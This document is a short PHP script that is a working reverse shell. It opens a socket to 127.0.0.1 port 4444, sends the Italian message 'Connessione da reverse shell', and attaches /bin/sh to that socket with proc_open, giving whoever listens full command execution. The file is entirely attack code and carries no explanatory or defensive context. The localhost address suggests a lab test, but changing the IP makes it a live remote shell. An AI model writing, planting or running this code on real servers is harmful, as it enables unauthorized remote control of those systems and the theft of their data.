<?php
$ip='127.0.0.1';
$port=4444;
$sock=fsockopen($ip, $port);
if($sock){
    fwrite($sock, "Connessione da reverse shell\n");
    $proc=proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
}
?>